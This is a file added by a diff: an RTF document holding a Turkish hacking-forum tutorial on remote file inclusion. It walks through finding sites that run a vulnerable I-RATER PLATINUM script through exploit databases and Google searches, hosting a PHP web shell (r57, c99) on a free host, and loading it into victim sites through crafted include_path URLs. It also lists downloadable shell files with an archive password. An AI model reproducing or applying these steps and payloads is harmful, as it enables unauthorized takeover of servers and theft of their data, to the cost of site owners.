@@ -1,0 +1,162 @@
+{\rtf1\ansi\deff0\nouicompat{\fonttbl{\f0\fnil\fcharset0 Calibri;}{\f1\fnil\fcharset238 Calibri;}}
+{\colortbl ;\red0\green0\blue255;}
+{\*\generator Riched20 10.0.10240}\viewkind4\uc1 
+\pard\sa200\sl276\slmult1\f0\fs22\lang31 File Include Nedir?_ Amac\f1\u305? Nedir? \par
+\par
+File \u305?n T\f0\lang1033\'fcrk\'e7e kar\f1\'ba\u305?l\u305?g\u305? ''Dosya'' Include un T\f0\'fcrk\'e7e kar\f1\'ba\u305?l\u305?\u287?\u305? ise ''i\f0\'e7ine almak* i\'e7ermek'' t\f1\u305?r.S\u305?md\u305? bu \u305?k\u305? sozcugu b\u305?rlest\u305?rg\u305?\u305?n\u305?zde File Include dosya i\f0\'e7ine almak eklemek manas\f1\u305?na gelmekted\u305?r.Pek\u305? ter\u305?m\u305? anlad\u305?ysak ne i\'bae yaramaktad\u305?r ;\par
+\par
+File include b\u305?z\u305?m \u305?sm\u305?nden anlad\u305?g\u305?m\u305?z \f0\'fczere sistemlere dosya ekleme yada dosya ca\f1\u287?\u305?rma manas\u305?na gelmekted\u305?r.Ama burada en onemli olan cag\u305?racag\u305?m\u305?z dosyan\u305?n turu \f0\'f6zellikle illegaliate merak saran k\f1\u305?\'ba\u305?ler i\f0\'e7in bu dosya turleri cok onemlidir.Orneg\f1\u305?n sald\u305?rgan birey cag\u305?racag\u305? bir shell dosyas\u305?yla servera erisebilir ve serverin i\f0\'e7indeki t\'fcm bilgileri al\f1\u305?p serverdaki sistemleri hackleyebilir.Bu t\u305?p bir sald\u305?r\u305? server sahibi i\f0\'e7in zarar demetir bunun yan\f1\u305?nda sald\u305?r\u305?ya yapan ki\'bai i\f0\'e7inse muthi\f1\'ba bir nam ve deney\u305?m olacakt\u305?r.\par
+\par
+File Include server sah\u305?bler\u305? i\f0\'e7in tam manas\f1\u305?yla bas belas\u305? hackerlar i\f0\'e7in sed\'fcnyadak\f1\u305? en kaliteli y\f0\'f6ntemlerden biridir...K\f1\u305?saca sadece site hacklemekle ilgilenenler i\f0\'e7inse hack\f1\u305?n vazgec\u305?lmes\u305? durumundad\u305?r....\par
+\par
+File Include Nas\u305?l Uygulan\u305?r ?\par
+\par
+File Include uygulnaams\u305?n\u305? anlatmak i\f0\'e7in once bir tak\f1\u305?m ter\u305?mleri tan\u305?man\u305?z gerekmektedir ;\par
+\par
+R57shell: Su andadunyadaki en kaliteli shelldir.Shell nedir shell k\u305?saca linux kabugudur.\u304?llegaliate merak saranlar i\f0\'e7inse internetin ta kend\f1\u305?s\u305?d\u305?r.\par
+\par
+C99shell: R57Shell in birazc\u305?k daha esk\u305? ve daha kullan\u305?ss\u305?z versiyonudur.\par
+\par
+TurkHackTeaM.OrG\par
+\par
+File include uygulamas\u305?n\u305?n uygulanmas\u305?na gecelim...\par
+\par
+\'aaimdi sizlere file includelardan nas\u305?l yararlanacag\u305?n\u305?z ve file include ter\u305?m\u305?nden bahsedecem....\par
+Simdi arkadaslar guncel vulnerabilities larin(Ac\u305?klarin) en cok yay\u305?nland\u305?g\u305? sistemleri size verey\u305?m ilk olarak ..\par
+{{\field{\*\fldinst{HYPERLINK www.milw0rm.com }}{\fldrslt{www.milw0rm.com\ul0\cf0}}}}\f1\fs22  ( web apps)\par
+{{\field{\*\fldinst{HYPERLINK www.turkhackteam.org }}{\fldrslt{www.turkhackteam.org\ul0\cf0}}}}\f1\fs22\par
+{{\field{\*\fldinst{HYPERLINK http://securityreason.com/exploit_alert/ }}{\fldrslt{http://securityreason.com/exploit_alert/\ul0\cf0}}}}\f1\fs22\par
+...\par
+\par
+Genel olarak en gen\u305?s ar\'baivmilw0rmda bulunmaktad\u305?r.\'aaimdi uygulamal\u305? olarak bir siteye sald\u305?ral\u305?m ki olay\u305? iyice anlay\u305?n.\u304?lk olarak vulnerabilities imizi bulal\u305?m...\par
+\par
+milw0rm.com webapps I-RATER PLATINUM Remote File Inclusion Vulnerabilities\par
+\par
+Sistemimiz bu oLsun ve s\u305?z bu dosyaya t\u305?klad\u305?g\u305?n\u305?zda I-RATER PLATINUM sistemde olan file include vulnerabilty ne ulasabileceksiniz.Ve ac\u305?lan sayfaya bakt\u305?g\u305?n\u305?zda \par
+\par
+{{\field{\*\fldinst{HYPERLINK http://www.xxx.com/admin/config_settings.tpl.php?include_path=[Shell }}{\fldrslt{http://www.xxx.com/admin/config_settings.tpl.php?include_path=[Shell\ul0\cf0}}}}\f1\fs22 ]\par
+seklinde bir seyle kars\u305?lacaks\u305?n\u305?z.Peki bu ne anlama gelmektedir onuda a\f0\'e7\f1\u305?klay\u305?m...\par
+\par
+xxx.com Bizim sald\u305?racag\u305?m\u305?z site (Yani Kurban Site Veya Server)\par
+\par
+Eger site sah\u305?b\u305? kulland\u305?g\u305? scriptin dosyalar\u305?n\u305? atarken bir dosya i\f0\'e7inde att\f1\u305?ysa o \par
+{{\field{\*\fldinst{HYPERLINK http://www.xxx.com/patch/admin/config_settings.tpl.php?include_path=[Shell }}{\fldrslt{http://www.xxx.com/patch/admin/config_settings.tpl.php?include_path=[Shell\ul0\cf0}}}}\f1\fs22 ] \'baeklinde olacakt\u305?r\par
+\par
+{{\field{\*\fldinst{HYPERLINK WwW.TurkHackTeaM.OrG }}{\fldrslt{WwW.TurkHackTeaM.OrG\ul0\cf0}}}}\f1\fs22\par
+\par
+\par
+config_settings.tpl.php?include_path=[Shell]-Buda file includemuzu oldugu b\f0\'f6l\'fcmd\'fcr ki bu devamli de\f1\u287?\u305?s\u305?kl\u305?k gosterir ben genel olarak yaz\u305?yorum bu su \'baekildede olabilir o siteye g\f0\'f6re de\f1\u287?i\'bair.\par
+\par
+Bunu nas\u305?l yapacag\u305?z \u305?lk milw0rm dan buldugumuz dosyan\u305?n ad\u305? I-RATER PLATINUM Remote File Inclusion Vulnerabilities peki bu ne anlama geliyo I-RATER PLATINUM olan sistemlerde dosya sokma ac\u305?g\u305?n\u305?n bulundugu manas\u305?na gelir bizde google.com'da I-RATER PLATINUM seklinde arat\u305?rsak yada sistemden yap\u305?lm\u305?s herhang\u305? b\u305?r s\u305?teye ulas\u305?p alt\u305?ndak\u305? copyrigt yaz\u305?s\u305?n\u305? google yazarsan\u305?z daha cok site bulabilirsiniz...\par
+\par
+Simdi gelelim file includeumuzu uygulamaya etkilenen sistemi ve nas\u305?l buldugumuzu \f0\'f6\f1\u287?rend\u305?\u287?\u305?m\u305?ze gore ger\u305?ye sadece prat\u305?k kal\u305?yor.\par
+\par
+shelli herhangi biryere upload ediyoruz linkimiz {{\field{\*\fldinst{HYPERLINK www.turkhackteam.org/yourshell.txt }}{\fldrslt{www.turkhackteam.org/yourshell.txt\ul0\cf0}}}}\f1\fs22  olsun ve i\'baime devam ediyorum simdi google aramas\u305?na geri donelim... arad\u305?g\u305?m\u305?z sitelerde simdi seriden tek tek deneme yap\u305?yoruz taki file include u yedirecegimiz bir site bulana kadar ....\par
+\par
+Yedirme seklimiz su sekilde olacak...\par
+\par
+{{\field{\*\fldinst{HYPERLINK http://www.xxx.com/admin/config_settings.tpl.php?include_path=http://www.turkhackteam.org/yourshell.txt }}{\fldrslt{http://www.xxx.com/admin/config_settings.tpl.php?include_path=http://www.turkhackteam.org/yourshell.txt\ul0\cf0}}}}\f1\fs22 ?\par
+\par
+Dikkat edilmesi gereken iki husus var shell linkinizi yazarken = sonras\u305? i\f0\'e7inn {{\field{\*\fldinst{HYPERLINK http:// }}{\fldrslt{http://\ul0\cf0}}}}\f0\fs22  ba\f1\'baa mutlaka konulmal\u305? ve sona da ''?'' bu konulmal\u305? mutlaka aksi takt\u305?rde yapt\u305?g\u305?m\u305?z uygulman\u305?n manas\u305? olmucakt\u305?r cunku cal\u305?smayacakt\u305?r...\par
+\par
+E\u287?er yerse kulland\u305?g\u305?n\u305?z shell e gore asag\u305?da ki gibi bir res\u305?m c\u305?kacakt\u305?r.Dosyalar s\u305?ralanm\u305?s yan\u305?nda permlerin oldugu.\par
+Perm = \u304?zin\par
+\par
+C99 ==>{{\field{\*\fldinst{HYPERLINK http://img151.imageshack.us/my.php?image=shellss1.jpg }}{\fldrslt{http://img151.imageshack.us/my.php?image=shellss1.jpg\ul0\cf0}}}}\f1\fs22\par
+\par
+R57 ==> {{\field{\*\fldinst{HYPERLINK http://img178.imageshack.us/my.php?image=r57mb8.jpg }}{\fldrslt{http://img178.imageshack.us/my.php?image=r57mb8.jpg\ul0\cf0}}}}\f1\fs22\par
+\par
+Ye\'bail Renkli olanlarda de\u287?i\'baiklik yapabilirsiniz \par
+\par
+Ve shelli siteye soktuk art\u305?k b\u305?r nev\u305? server s\u305?z\u305?n gerisi size kalm\u305?\'ba...\par
+\par
+Shell Link (C99)\par
+\par
+\u304?ND\u304?R \par
+\par
+rar \'baifresi : turkhackteam.org\par
+\par
+\\\\ By NightWolf //\par
+\par
+\par
+-------------------------------\par
+\par
+c99.shell.php\par
+hbtcasus.php\par
+phpRemotevieW.php\par
+PHPShellbyMacker.php\par
+r57shell-1.3.php\par
+r57shell-v1.24.php\par
+c99shellbeta.php\par
+kobra.php\par
+phpshell.php\par
+PHVayv.php\par
+r57shell-v1.0.php\par
+r57.php\par
+cmd.asp\par
+CyperSpy5.asp\par
+klasvayv.asp\par
+CyberEye.asp\par
+EFSo2.asp\par
+Zehir4.asp\par
+\par
+DOWNLOAD \par
+\par
+Verdi\u287?im Sitelerdeki A\f0\'e7\f1\u305?klar Kapanm\u305?\'ba Olabilir Bu Y\f0\'fczden Ba\f1\'baka Sitelerde Deneyin Veya G\f0\'fcncel Ba\f1\'baka A\f0\'e7\f1\u305?klar Aray\u305?n \par
+\par
+NOT : BAZI ARKADA\'aaLAR HALA ANLAMAMAKTA D\u304?REN\u304?YOR SHELL B\u304?RNEV\u304? BACKDOORDUR BU Y\f0\'dcZDEN V\f1\u304?R\f0\'dcS PROGRMLARI V\f1\u304?R\f0\'dcS OLARAK G\'d6R\'dcR\par
+\par
+\par
+------------------------------------------------------------------------\par
+\par
+\par
+\'c7o\f1\u287?u arkada\'ba\u305?m\u305?z shelli nas\u305?l upload edeceklerini ve nas\u305?l kullanacaklar\u305?n\u305? soruyor... Bu konuda k\u305?sa bir a\f0\'e7\f1\u305?klama yapay\u305?m\par
+\par
+1) \f0\'d6ncelikler kendinize birtane \'fccretsiz site al\f1\u305?yoruz ( Forumda Hosting B\f0\'f6l\'fcm\'fcne bakarsan\f1\u305?z bulursunuz ) \par
+\par
+2) \u304?ndirdi\u287?iniz bu shelleri alm\u305?\'ba oldu\u287?unuz \f0\'fccretsiz siteye y\'fckl\'fcyorsunuz. \par
+\par
+Bu 2 a\f1\'baamay\u305? yapt\u305?ktan sonra ... \par
+\par
+3) Remote File Inclusion Vulnerabilities a\f0\'e7\f1\u305?\u287?\u305?n\u305? ar\u305?yaca\u287?\u305?z... Bu a\f0\'e7\f1\u305?\u287?\u305? yay\u305?nlayan siteler var \par
+G\f0\'fcncel A\'e7\f1\u305?klar - Hack I TurkHackTeam Turkish Hacking&Security Platform \par
+ExploitAlert Database - Exploits - Index - SecurityReason.com \par
+veya ba\'baka sitelerdende bakabilirsiniz, a\f0\'e7\f1\u305?k aramak i\f0\'e7in tekbir siteye ba\f1\u287?l\u305? kalmay\u305?n ne kadar \f0\'e7ok site o kadar \'e7ok a\'e7\f1\u305?k bulursunuz ...\par
+\par
+4) \'aaimdi her\'baey haz\u305?r free sitemizi ald\u305?k , shelleri upload ettik , g\f0\'fcncel a\'e7\f1\u305?kar\u305? bulduk. geldik bu a\f0\'e7\f1\u305?klar\u305?n hangi sitelerde oldu\u287?unu bulmaya bunun i\f0\'e7in Google yi kullanaca\f1\u287?\u305?z... \par
+Konuda kulland\u305?\u287?\u305?n eski bir a\f0\'e7\f1\u305?kt\u305?r o y\f0\'fczden bu a\'e7\f1\u305?\u287?\u305? olan site pek kalmam\u305?\'bat\u305?r ama ben ayn\u305? a\f0\'e7\f1\u305?k \f0\'fczerinden anlataca\f1\u287?\u305?m...\par
+\par
+*\par
+Al\u305?nt\u305?:\par
+I-RATER PLATINUM Remote File Inclusion Vulnerabilities\par
+\par
+Sistemimiz bu oLsun ve s\u305?z bu dosyaya t\u305?klad\u305?g\u305?n\u305?zda I-RATER PLATINUM sistemde olan file include vulnerabilty ne ulasabileceksiniz.Ve ac\u305?lan sayfaya bakt\u305?g\u305?n\u305?zda \par
+\par
+{{\field{\*\fldinst{HYPERLINK http://www.xxx.com/admin/config_sett...?include_path= }}{\fldrslt{http://www.xxx.com/admin/config_sett...?include_path=\ul0\cf0}}}}\f1\fs22  [Shell]\par
+seklinde bir seyle kars\u305?lacaks\u305?n\u305?z.Peki bu ne anlama gelmektedir onuda a\f0\'e7\f1\u305?klay\u305?m...\par
+\par
+\par
+{{\field{\*\fldinst{HYPERLINK http://www.xxx.com/patch/admin/confi...?include_path= }}{\fldrslt{http://www.xxx.com/patch/admin/confi...?include_path=\ul0\cf0}}}}\f1\fs22  [Shell] \'baeklinde olacakt\u305?r\par
+5) Googlede aram\u305?m\u305?z yapt\u305?k ve bir site se\f0\'e7tik a\'e7\f1\u305?\u287?\u305? bu site \f0\'fczerinden deniyece\f1\u287?iz\par
+\par
+* {{\field{\*\fldinst{HYPERLINK http://www.kurbansite.com/patch/admin/config_settings.tpl.php?include_path= }}{\fldrslt{http://www.kurbansite.com/patch/admin/config_settings.tpl.php?include_path=\ul0\cf0}}}}\f1\fs22\par
+\par
+= i\'baaretinden sonra Shelli upload etti\u287?imiz sitenin adresini ekliyece\u287?iz \par
+Yani\par
+\par
+Al\u305?nt\u305?:\par
+{{\field{\*\fldinst{HYPERLINK http://www.kurbansite.com/patch/admin/config_settings.tpl.php?include_path=http://www.ald\u305?\u287?\u305?m\u305?zbedavasite.com/shell.txt }}{\fldrslt{http://www.kurbansite.com/patch/admin/config_settings.tpl.php?include_path=http://www.ald\u305?\u287?\u305?m\u305?zbedavasite.com/shell.txt\ul0\cf0}}}}\f1\fs22 ?\par
+Al\u305?nt\u305?:\par
+Dikkat edilmesi gereken iki husus var shell linkinizi yazarken = sonras\u305? i\f0\'e7inn {{\field{\*\fldinst{HYPERLINK http:// }}{\fldrslt{http://\ul0\cf0}}}}\f0\fs22  ba\f1\'baa mutlaka konulmal\u305? ve sona da ''?'' bu konulmal\u305? mutlaka aksi takt\u305?rde yapt\u305?g\u305?m\u305?z uygulman\u305?n manas\u305? olmucakt\u305?r cunku cal\u305?smayacakt\u305?r...\par
+\par
+6) E\u287?er sitede a\f0\'e7\f1\u305?k varsa kar\'ba\u305?m\u305?zda \'ba\f0\'f6yle bi ekran gelecek\par
+\par
+Al\f1\u305?nt\u305?:\par
+C99 ==>ImageShack\f0\'ae - Online Photo and Video Hosting\par
+\par
+R57 ==> ImageShack\'ae - Online Photo and Video Hosting\par
+Al\f1\u305?nt\u305?:\par
+Ye\'bail Renkli olanlarda de\u287?i\'baiklik yapabilirsiniz\par
+\f0\lang31\par
+}
+ 
